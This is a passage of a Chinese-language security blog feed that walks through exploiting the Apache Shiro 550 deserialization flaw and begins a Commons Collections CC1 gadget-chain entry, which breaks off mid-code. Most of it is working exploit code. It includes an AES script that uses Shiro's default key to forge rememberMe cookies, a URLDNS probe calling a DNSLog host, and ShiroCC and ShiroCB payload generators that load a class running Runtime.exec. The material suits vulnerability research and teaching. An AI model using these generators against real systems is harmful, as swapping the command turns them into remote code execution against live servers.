alt="image-20231213212151238"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213211930638.png" alt="image-20231213211930638"></p><p>常量 <code>decryptionCipherKey</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213211927110.png" alt="image-20231213211927110"></p><h5 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h5><p><code>convertPrincipalsToBytes()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214131441153.png" alt="image-20231214131441153"></p><p><code>encrypt()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214131444662.png" alt="image-20231214131444662"></p><p>可以知道加密算法为 AES的CBC模式</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214131500022.png" alt="image-20231214131500022"></p><p>加解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLDNS</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://gvjpeqqpqk.dgrh3.cn&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// put前，反射把hashCode的值修改（不为-1）</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashCode.set(url, <span class="number">999</span>);</span><br><span class="line">        <span class="comment">// put后，hashCode会改变</span></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// put后改回-1</span></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 序列化输出</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将构造好的 DNSLog 序列化文件加密，去除 JSESSIONID，伪造 rememberMe</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214125009534.png" alt="image-20231214125009534"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214125101154.png" alt="image-20231214125101154"></p><h4 id="ShiroCC"><a href="#ShiroCC" class="headerlink" title="ShiroCC"></a>ShiroCC</h4><p>Shiro无CC，需要手动添加CC依赖</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214160433041.png" alt="image-20231214160433041"></p><p><strong>ShiroCC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.Shiro550;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">byteCodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Compiler\\Idea\\Java_Sec\\target\\classes\\Gadget\\CC3\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        byteCodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryFied</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryFied.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryFied.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Test</strong> 构建class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密后发包</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214160356965.png" alt="image-20231214160356965"></p><h4 id="ShiroCB"><a href="#ShiroCB" class="headerlink" title="ShiroCB"></a>ShiroCB</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.Shiro550;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC3</span></span><br><span class="line">        TemplatesImpl templatesimpl=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c=templatesimpl.getClass();</span><br><span class="line">        Field _nameField=c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templatesimpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field _byteCodesField=c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Compiler\\Idea\\JavaSec\\target\\classes\\Gadget\\CC3\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes= &#123;code&#125;;</span><br><span class="line">        _byteCodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templatesimpl);</span><br><span class="line">        priorityQueue.add(templatesimpl);</span><br><span class="line">        Class clazz=PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密后发包</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214200233481.png" alt="image-20231214200233481"></p>]]></content>
      
      
      <categories>
          
          <category> Vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections</title>
      <link href="/2023/11/30/java/cc/CommonsCollections/"/>
      <url>/2023/11/30/java/cc/CommonsCollections/</url>
      
        <content type="html"><![CDATA[<h2 id="CC-GadgetChainMap"><a href="#CC-GadgetChainMap" class="headerlink" title="CC-GadgetChainMap"></a>CC-GadgetChainMap</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231219123305619.png" alt="image-20231219123305619"></p><h2 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1_LazyMap"></a>CC1_LazyMap</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">    commons-collections: 3.1</span></span><br><span class="line"><span class="comment">    Jdk &lt; 8u71</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1_LazyMap</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title 